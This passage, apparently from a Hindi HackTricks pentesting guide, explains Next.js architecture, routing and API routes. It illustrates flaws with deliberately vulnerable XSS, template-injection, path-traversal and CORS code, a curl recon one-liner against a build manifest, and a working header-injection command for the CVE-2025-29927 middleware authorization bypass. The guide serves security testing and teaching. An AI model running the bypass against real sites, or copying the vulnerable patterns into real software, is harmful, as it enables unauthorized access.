# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Next.js एप्लिकेशन की सामान्य वास्तुकला

### सामान्य फ़ाइल संरचना

एक मानक Next.js प्रोजेक्ट एक विशिष्ट फ़ाइल और निर्देशिका संरचना का पालन करता है जो इसकी सुविधाओं जैसे रूटिंग, API endpoints और स्टैटिक असेट प्रबंधन को सुविधाजनक बनाती है। यहाँ एक सामान्य लेआउट है:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### मुख्य डायरेक्टरी और फ़ाइलें

- **public/:** इमेज, फ़ॉन्ट और अन्य फाइलों जैसे स्थिर assets को होस्ट करता है। यहाँ की फ़ाइलें रूट पथ (`/`) पर उपलब्ध होती हैं।
- **app/:** आपकी एप्लिकेशन के pages, layouts, components, और API routes के लिए केंद्रीय डायरेक्टरी। यह **App Router** paradigm को अपनाता है, जिससे उन्नत routing फीचर्स और server-client component विभाजन संभव होता है।
- **app/layout.tsx:** आपकी एप्लिकेशन के लिए root layout परिभाषित करता है, जो सभी पेजों को घेरता है और headers, footers, और navigation bars जैसे सुसंगत UI तत्व प्रदान करता है।
- **app/page.tsx:** root route `/` के लिए एंट्री प्वाइंट के रूप में कार्य करता है, और होम पेज रेंडर करता है।
- **app/[route]/page.tsx:** static और dynamic routes को हैंडल करता है। `app/` के भीतर हर फ़ोल्डर एक route segment का प्रतिनिधित्व करता है, और उन फ़ोल्डर्स के अंदर `page.tsx` route के component के अनुरूप होता है।
- **app/api/:** API routes होते हैं, जिनकी मदद से आप HTTP requests को हैंडल करने वाले serverless functions बना सकते हैं। ये routes पारंपरिक `pages/api` डायरेक्टरी की जगह लेते हैं।
- **app/components/:** reusable React components को रखता है जिन्हें विभिन्न पेज और लेआउट्स में उपयोग किया जा सकता है।
- **app/styles/:** global CSS फाइलें और component-scoped styling के लिए CSS Modules शामिल करता है।
- **app/utils/:** utility functions, helper modules, और अन्य non-UI लॉजिक शामिल करता है जिन्हें एप्लिकेशन में साझा किया जा सकता है।
- **.env.local:** लोकल development environment के लिए विशिष्ट environment variables रखता है। ये वेरिएबल्स version control में **नहीं** कमिट किए जाते।
- **next.config.js:** Next.js के व्यवहार को कस्टमाइज़ करता है, जिसमें webpack configurations, environment variables, और security settings शामिल हैं।
- **tsconfig.json:** प्रोजेक्ट के लिए TypeScript सेटिंग्स कॉन्फ़िगर करता है, जिससे type checking और अन्य TypeScript फीचर्स सक्षम होते हैं।
- **package.json:** प्रोजेक्ट की dependencies, scripts, और metadata को प्रबंधित करता है।
- **README.md:** प्रोजेक्ट के बारे में डॉक्यूमेंटेशन और जानकारी प्रदान करता है, जिसमें setup निर्देश, उपयोग के निर्देश और अन्य संबंधित विवरण शामिल हैं।
- **yarn.lock / package-lock.json:** प्रोजेक्ट की dependencies को विशिष्ट संस्करणों पर लॉक करता है, जिससे विभिन्न वातावरणों में स्थिर इंस्टॉलेशन सुनिश्चित होता है।

## Next.js में क्लाइंट-साइड

### `app` डायरेक्टरी में फ़ाइल-आधारित रूटिंग

`app` डायरेक्टरी नवीनतम Next.js वर्शन में रूटिंग की बुनियाद है। यह filesystem का उपयोग करके routes को परिभाषित करता है, जिससे route मैनेजमेंट सहज और स्केलेबल बन जाता है।

<details>

<summary>रूट पथ / को हैंडल करना</summary>

**फ़ाइल संरचना:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**मुख्य फाइलें:**

- **`app/page.tsx`**: रूट पाथ `/` के लिए अनुरोधों को संभालता है।
- **`app/layout.tsx`**: एप्लिकेशन के लिए लेआउट को परिभाषित करता है, जो सभी पेजों को घेरता है।

**इम्प्लीमेंटेशन:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**व्याख्या:**

- **Route Definition:** `page.tsx` फ़ाइल जो सीधे `app` डायरेक्टरी के अंदर है, वह `/` रूट के अनुरूप होती है।
- **Rendering:** यह component होम पेज की सामग्री रेंडर करता है।
- **Layout Integration:** `HomePage` component को `layout.tsx` में रैप किया गया है, जो हैडर, फूटर और अन्य सामान्य तत्व शामिल कर सकता है।

</details>

<details>

<summary>Handling Other Static Paths</summary>

**Example: `/about` Route**

**File Structure:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**क्रियान्वयन:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**व्याख्या:**

- **रूट परिभाषा:** `page.tsx` फ़ाइल `about` फ़ोल्डर के अंदर `/about` रूट के अनुरूप है।
- **रेंडरिंग:** यह component about पेज की सामग्री रेंडर करता है।

</details>

<details>

<summary>डायनामिक रूट्स</summary>

डायनामिक रूट्स variable segments वाले paths को हैंडल करने की अनुमति देते हैं, जिससे applications IDs, slugs जैसे parameters के आधार पर सामग्री दिखा सकती हैं।

**उदाहरण: `/posts/[id]` रूट**

**फ़ाइल संरचना:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**कार्यान्वयन:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**व्याख्या:**

- **डायनामिक सेगमेंट:** `[id]` मार्ग में एक डायनामिक सेगमेंट दर्शाता है, जो URL से `id` पैरामीटर को कैप्चर करता है।
- **पैरामीटर एक्सेस करना:** `params` ऑब्जेक्ट डायनामिक पैरामीटर रखता है, जिसे component के अंदर एक्सेस किया जा सकता है।
- **रूट मिलान:** `/posts/*` से मेल खाने वाला कोई भी पाथ, जैसे `/posts/1`, `/posts/abc`, आदि, इस component द्वारा हैंडल किया जाएगा।

</details>

<details>

<summary>नेस्टेड रूट्स</summary>

Next.js ने नेस्टेड रूटिंग सपोर्ट की है, जिससे डायरेक्टरी लेआउट के अनुरूप पदानुक्रमिक रूट संरचनाएँ बनाई जा सकती हैं।

**उदाहरण: `/dashboard/settings/profile` रूट**

**फ़ाइल संरचना:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**क्रियान्वयन:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**स्पष्टीकरण:**

- **गहरी नेस्टिंग:** `page.tsx` फ़ाइल `dashboard/settings/profile/` के अंदर `/dashboard/settings/profile` रूट के अनुरूप होती है।
- **हायरार्की का प्रतिबिंब:** डायरेक्टरी संरचना URL पथ को प्रतिबिंबित करती है, जिससे रख-रखाव और स्पष्टता में सुधार होता है।

</details>

<details>

<summary>Catch-All रूट्स</summary>

Catch-all रूट कई नेस्टेड सेगमेंट या अज्ञात पाथ्स को हैंडल करते हैं, रूट हैंडलिंग में लचीलापन प्रदान करते हैं।

**उदाहरण: `/*` रूट**

**फ़ाइल संरचना:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**कार्यान्वयन:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**व्याख्या:**

- **Catch-All Segment:** `[...slug]` बचे हुए सभी path segments को एक array के रूप में कैप्चर करता है।
- **Usage:** डायनामिक रूटिंग परिदृश्यों को हैंडल करने के लिए उपयोगी है, जैसे user-generated paths, nested categories, आदि।
- **Route Matching:** `/anything/here`, `/foo/bar/baz`, आदि जैसे paths इस component द्वारा हैंडल होते हैं।

</details>

### संभावित क्लाइंट-साइड कमजोरियाँ

हालांकि Next.js एक सुरक्षित आधार प्रदान करता है, गलत कोडिंग प्रथाएँ कमजोरियाँ ला सकती हैं। प्रमुख क्लाइंट-साइड कमजोरियों में शामिल हैं:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS हमले तब होते हैं जब दुर्भावनापूर्ण स्क्रिप्ट्स विश्वसनीय वेबसाइटों में इंजेक्ट की जाती हैं। हमलावर उपयोगकर्ता के ब्राउज़र में स्क्रिप्ट्स निष्पादित कर सकते हैं, डेटा चुरा सकते हैं या उपयोगकर्ता की ओर से क्रियाएँ करवा सकते हैं।

**कमजोर कोड का उदाहरण:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**क्यों यह कमजोर है:** `dangerouslySetInnerHTML` का उपयोग अविश्वसनीय इनपुट के साथ करने से हमलावरों को दुर्भावनापूर्ण स्क्रिप्ट इंजेक्ट करने की अनुमति मिलती है।

</details>

<details>

<summary>Client-Side Template Injection</summary>

यह तब होता है जब टेम्पलेट्स में उपयोगकर्ता इनपुट सही तरीके से संभाले नहीं जाते हैं, जिससे हमलावर टेम्पलेट या अभिव्यक्तियाँ इंजेक्ट करके उन्हें निष्पादित कर सकते हैं।

**कमजोर कोड का उदाहरण:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**क्यों यह कमजोर है:** यदि `template` या `data` में हानिकारक सामग्री शामिल है, तो यह अनचाहे कोड के निष्पादन का कारण बन सकता है।

</details>

<details>

<summary>Client Path Traversal</summary>

यह एक vulnerability है जो attackers को client-side paths में हेरफेर करके अनचाहे कार्य करने की अनुमति देती है, जैसे Cross-Site Request Forgery (CSRF)। server-side path traversal के विपरीत, जो सर्वर के फाइल सिस्टम को लक्षित करता है, CSPT client-side मैकेनिज्म का दुरुपयोग करके वैध API requests को हानिकारक endpoints की ओर पुनर्निर्देशित करने पर केंद्रित है।

**संवेदनशील कोड का उदाहरण:** 

एक Next.js एप्लिकेशन उपयोगकर्ताओं को फ़ाइलें अपलोड और डाउनलोड करने की अनुमति देता है। डाउनलोड फ़ीचर client side पर लागू किया गया है, जहाँ उपयोगकर्ता डाउनलोड करने के लिए फ़ाइल पथ निर्दिष्ट कर सकते हैं।
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### हमला परिदृश्य

1. **आक्रमणकारी का उद्देश्य**: `filePath` को बदलकर एक महत्वपूर्ण फ़ाइल (जैसे `admin/config.json`) को हटाने के लिए CSRF attack करना।
2. **Exploiting CSPT**:
- **Malicious Input**: आक्रमणकारी एक URL तैयार करता है जिसमें संशोधित `filePath` होता है, जैसे `../deleteFile/config.json`।
- **Resulting API Call**: क्लाइंट-साइड कोड `/api/files/../deleteFile/config.json` पर एक अनुरोध भेजता है।
- **Server's Handling**: यदि सर्वर `filePath` को मान्य नहीं करता है, तो वह अनुरोध को प्रोसेस कर सकता है, संभवतः संवेदनशील फ़ाइलें हटा या उजागर कर देगा।
3. **Executing CSRF**:
- **Crafted Link**: आक्रमणकारी पीड़ित को एक लिंक भेजता है या एक दुष्ट स्क्रिप्ट एम्बेड करता है जो संशोधित `filePath` के साथ डाउनलोड अनुरोध को ट्रिगर करता है।
- **Outcome**: पीड़ित अनजाने में कार्रवाई निष्पादित करता है, जिससे अनधिकृत फ़ाइल एक्सेस या हटाना होता है।

</details>

### Recon: _buildManifest के माध्यम से static export route की खोज

जब `nextExport`/`autoExport` true होते हैं (static export), Next.js HTML में `buildId` को एक्सपोज़ करता है और `/_next/static/<buildId>/_buildManifest.js` पर एक build manifest सर्व करता है। वहाँ का `sortedPages` array और route→chunk मैपिंग हर prerendered पृष्ठ को बिना brute force के सूचीबद्ध करते हैं।

- रूट response से buildId लें (अक्सर नीचे छपा होता है) या उन `<script>` टैग्स से जो `/_next/static/<buildId>/...` लोड करते हैं।
- manifest को fetch करें और routes निकालें:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- खोजे गए paths (उदाहरण के लिए `/docs`, `/docs/content/examples`, `/signin`) का उपयोग auth testing और endpoint discovery के लिए करें।

## Next.js में सर्वर-साइड

### सर्वर-साइड रेंडरिंग (SSR)

प्रत्येक request पर पेज सर्वर पर रेंडर होते हैं, जिससे यूज़र को पूरी तरह रेंडर किया हुआ HTML मिलता है। ऐसे मामलों में, आपको requests को process करने के लिए अपना custom server बनाना चाहिए।

**उपयोग के मामले:**

- बार-बार बदलने वाली डायनामिक सामग्री।
- SEO ऑप्टिमाइज़ेशन, क्योंकि search engines पूरी तरह रेंडर किए गए पेज को crawl कर सकते हैं।

**इम्प्लीमेंटेशन:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### स्टैटिक साइट जेनरेशन (SSG)

पेज़ों को बिल्ड समय पर प्री-रेंडर किया जाता है, जिससे लोड समय तेज़ होते हैं और सर्वर लोड कम होता है।

**उपयोग के मामले:**

- ऐसी सामग्री जो अक्सर बदलती नहीं है।
- ब्लॉग, डॉक्यूमेंटेशन, मार्केटिंग पेज।

**क्रियान्वयन:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### सर्वरलेस फ़ंक्शन्स (API Routes)

Next.js API endpoints को serverless functions के रूप में बनाने की अनुमति देता है। ये फ़ंक्शन ऑन-डिमांड चलते हैं और dedicated server की आवश्यकता नहीं होती।

**उपयोग के मामले:**

- फ़ॉर्म सबमिशन को हैंडल करना।
- डेटाबेस के साथ इंटरैक्ट करना।
- डेटा प्रोसेसिंग या third-party APIs के साथ इंटीग्रेशन।

**इम्प्लीमेंटेशन:**

Next.js 13 में `app` directory के परिचय के साथ, routing और API हैंडलिंग अधिक लचीली और शक्तिशाली हो गई है। यह आधुनिक तरीका file-based routing सिस्टम के साथ घनिष्ठ रूप से मेल खाता है लेकिन इसमें उन्नत क्षमताएँ भी शामिल हैं, जिनमें server और client components के लिए सपोर्ट भी है।

#### बेसिक रूट हैंडलर

**फ़ाइल संरचना:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**कार्यान्वयन:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**स्पष्टीकरण:**

- **Location:** API routes `app/api/` डायरेक्टरी के अंतर्गत रखे जाते हैं।
- **File Naming:** प्रत्येक API endpoint अपने स्वयं के फोल्डर में स्थित होता है, जिसमें `route.js` या `route.ts` फ़ाइल होती है।
- **Exported Functions:** एकल default export की बजाय, विशिष्ट HTTP method functions (जैसे `GET`, `POST`) export किए जाते हैं।
- **Response Handling:** responses लौटाने के लिए `Response` constructor का उपयोग करें, जो headers और status codes पर अधिक नियंत्रण की अनुमति देता है।

#### अन्य paths और methods को कैसे हैंडल करें:

<details>

<summary>विशिष्ट HTTP Methods को हैंडल करना</summary>

Next.js 13+ आपको उसी `route.js` या `route.ts` फ़ाइल के भीतर विशिष्ट HTTP methods के लिए handlers परिभाषित करने की अनुमति देता है, जिससे कोड साफ़ और अधिक व्यवस्थित बनता है।

**उदाहरण:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**व्याख्या:**

- **Multiple Exports:** प्रत्येक HTTP मेथड (`GET`, `PUT`, `DELETE`) की अपनी निर्यात की गई फ़ंक्शन होती है।
- **Parameters:** दूसरा argument `params` के माध्यम से route parameters तक पहुँच प्रदान करता है।
- **Enhanced Responses:** response objects पर अधिक नियंत्रण, जिससे हेडर और status code का सटीक प्रबंधन संभव होता है।

</details>

<details>

<summary>Catch-All और नेस्टेड Routes</summary>

Next.js 13+ advanced routing features जैसे कि catch-all routes और nested API routes को सपोर्ट करता है, जिससे अधिक dynamic और scalable API संरचनाएँ बनाना संभव होता है।

**Catch-All Route उदाहरण:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**व्याख्या:**

- **Syntax:** `[...]` एक catch-all segment को दर्शाता है, जो सभी nested paths को पकड़ता है।
- **Usage:** उन APIs के लिए उपयोगी जो विभिन्न route depths या dynamic segments को संभालने की आवश्यकता होती हैं।

**Nested Routes का उदाहरण:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**व्याख्या:**

- **डिप नेस्टिंग:** हायरार्किकल API संरचनाओं की अनुमति देता है, जो संसाधन संबंधों को प्रतिबिंबित करती हैं।
- **पैरामीटर एक्सेस:** `params` ऑब्जेक्ट के माध्यम से कई route पैरामीटरों तक आसानी से पहुँच प्राप्त करें।

</details>

<details>

<summary>Next.js 12 और उससे पहले में API routes को हैंडल करना</summary>

## `pages` डायरेक्टरी में API Routes (Next.js 12 और इससे पहले)

Next.js 13 ने जब `app` डायरेक्टरी और उन्नत routing क्षमताएँ पेश कीं, उस से पहले API routes मुख्य रूप से `pages` डायरेक्टरी के भीतर परिभाषित किए जाते थे। यह तरीका अभी भी Next.js 12 और उससे पहले के वर्शन में व्यापक रूप से उपयोग और समर्थित है।

#### बेसिक API Route

**फ़ाइल संरचना:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**क्रियान्वयन:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**व्याख्या:**

- **स्थान:** API routes `pages/api/` डायरेक्टरी के अंदर स्थित होते हैं.
- **निर्यात:** `export default` का उपयोग हैंडलर फ़ंक्शन को परिभाषित करने के लिए करें.
- **फ़ंक्शन सिग्नेचर:** हैंडलर को `req` (HTTP request) और `res` (HTTP response) ऑब्जेक्ट मिलते हैं.
- **रूटिंग:** फ़ाइल का नाम (`hello.js`) endpoint `/api/hello` के साथ मैप होता है.

#### डायनेमिक API Routes

**फ़ाइल संरचना:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**कार्यान्वयन:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**स्पष्टीकरण:**

- **Dynamic Segments:** Square brackets (`[id].js`) डायनामिक रूट सेगमेंट्स को दर्शाते हैं।
- **Accessing Parameters:** डायनामिक पैरामीटर तक पहुँचने के लिए `req.query.id` का उपयोग करें।
- **Handling Methods:** विभिन्न HTTP methods (`GET`, `PUT`, `DELETE`, आदि) को हैंडल करने के लिए शर्तीय लॉजिक का उपयोग करें।

#### विभिन्न HTTP Methods को हैंडल करना

जबकि बेसिक API route उदाहरण एक ही फ़ंक्शन के भीतर सभी HTTP methods को हैंडल करता है, बेहतर स्पष्टता और रखरखाव के लिए आप अपने कोड को प्रत्येक method को स्पष्ट रूप से हैंडल करने के लिए संरचित कर सकते हैं।

**उदाहरण:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**सर्वोत्तम प्रथाएँ:**

- **Separation of Concerns:** विभिन्न HTTP मेथड्स के लिए लॉजिक को स्पष्ट रूप से अलग रखें।
- **Response Consistency:** क्लाइंट-साइड हैंडलिंग को आसान बनाने के लिए संगत response संरचनाएँ सुनिश्चित करें।
- **Error Handling:** असमर्थित मेथड्स और अप्रत्याशित त्रुटियों को उपयुक्त तरीके से संभालें।

</details>

### CORS कॉन्फ़िगरेशन

यह नियंत्रित करें कि कौन से origins आपके API routes को एक्सेस कर सकते हैं, ताकि Cross-Origin Resource Sharing (CORS) कमजोरियों का जोखिम कम हो।

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
ध्यान दें कि **CORS को सभी API routes में भी कॉन्फ़िगर किया जा सकता है** **`middleware.ts`** फ़ाइल के अंदर:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**समस्या:**

- **`Access-Control-Allow-Origin: '*'`:** किसी भी वेबसाइट को API तक पहुँच की अनुमति देता है, जिससे संभावित रूप से दुर्भावनापूर्ण साइटें बिना प्रतिबंध के आपके API के साथ इंटरैक्ट कर सकती हैं।
- **सभी मेथड की अनुमति:** सभी मेथड की अनुमति देने से हमलावरों को अनचाहे कार्य करने का मौका मिल सकता है।

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

हमलावर दुर्भावनापूर्ण वेबसाइटें बना सकते हैं जो आपके API पर अनुरोध भेजती हैं, और संभावित रूप से डेटा प्राप्ति, डेटा हेरफेर, या प्रमाणीकृत उपयोगकर्ताओं की ओर से अनचाहे कार्यों को ट्रिगर करने जैसी सुविधाओं का दुरुपयोग कर सकती हैं।


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### सर्वर कोड का क्लाइंट साइड में एक्सपोज़ होना

यह आसान हो सकता है कि आप **सर्वर में उपयोग किए गए कोड को क्लाइंट-साइड में भी एक्सपोज़ और उपयोग कर लें**, किसी भी कोड फ़ाइल को क्लाइंट-साइड पर कभी एक्सपोज़ न होने देने का सबसे अच्छा तरीका है फाइल की शुरुआत में इस import का उपयोग करना:
```js
import "server-only"
```
## प्रमुख फ़ाइलें और उनकी भूमिकाएँ

### `middleware.ts` / `middleware.js`

**Location:** प्रोजेक्ट की रूट या `src/` के भीतर।

**Purpose:** अनुरोध संसाधित होने से पहले server-side serverless function में कोड निष्पादित करता है, जिससे authentication, redirects, या responses में बदलाव जैसे कार्य संभव होते हैं।

**Execution Flow:**

1. **Incoming Request:** middleware अनुरोध को रोकता/intercept करता है।
2. **Processing:** अनुरोध के आधार पर ऑपरेशन करता है (उदा., authentication की जांच)।
3. **Response Modification:** response में बदलाव कर सकता है या अगले handler को नियंत्रण पास कर सकता है।

**Example Use Cases:**

- unauthenticated users को redirect करना।
- कस्टम headers जोड़ना।
- अनुरोधों की logging करना।

**Sample Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

यदि authorization middleware में लागू है, तो प्रभावित Next.js releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) को `x-middleware-subrequest` header इंजेक्ट करके बायपास किया जा सकता है। फ्रेमवर्क middleware recursion को स्किप करके protected page रिटर्न कर देगा।

- बेसलाइन व्यवहार आमतौर पर `/api/auth/signin` जैसे login route पर 307 redirect होता है।
- रिस्पॉन्स को 200 में बदलने के लिए लंबा `x-middleware-subrequest` value भेजें (`middleware` को दोहराएँ ताकि `MAX_RECURSION_DEPTH` तक पहुँचें):
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- क्योंकि प्रमाणीकृत पेज कई subresources लोड करते हैं, assets के redirect होने से रोकने के लिए हर request में यह header जोड़ें (उदा., Burp Match/Replace में एक empty match string)।

### `next.config.js`

**Location:** प्रोजेक्ट की रूट डायरेक्टरी।

**Purpose:** Next.js के व्यवहार को configure करता है — फीचर enable/disable करना, webpack configurations customize करना, environment variables सेट करना, और कई security features configure करना।

**Key Security Configurations:**

<details>

<summary>सुरक्षा हेडर</summary>

Security headers आपके application की सुरक्षा बढ़ाते हैं, ब्राउज़रों को कंटेंट कैसे हैंडल करना है यह निर्देश देकर। ये Cross-Site Scripting (XSS), Clickjacking, और MIME type sniffing जैसे विभिन्न हमलों को कम करने में मदद करते हैं:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**उदाहरण:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>छवि अनुकूलन सेटिंग्स</summary>

Next.js प्रदर्शन के लिए छवियों का अनुकूलन करता है, लेकिन गलत कॉन्फ़िगरेशन सुरक्षा कमजोरियों का कारण बन सकते हैं, जैसे कि अविश्वसनीय स्रोतों को हानिकारक सामग्री इंजेक्ट करने की अनुमति देना।

**खराब कॉन्फ़िगरेशन का उदाहरण:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**समस्या:**

